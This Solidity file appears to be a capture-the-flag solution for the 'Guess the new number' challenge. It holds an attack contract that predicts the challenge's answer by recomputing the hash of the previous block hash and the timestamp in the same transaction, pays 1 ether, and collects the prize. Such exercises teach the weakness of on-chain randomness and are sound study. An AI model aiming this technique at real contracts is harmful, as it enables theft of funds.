pragma solidity ^0.4.21;

import '../GuessTheNewNumberChallenge.sol';

contract GuessTheNewNumberAttack {
  function perform(address _challenge) external payable {
    GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_challenge);

    challenge.guess.value(1 ether)(
      uint8(keccak256(block.blockhash(block.number - 1), now))
    );
  }

  function() external payable {
  }
}
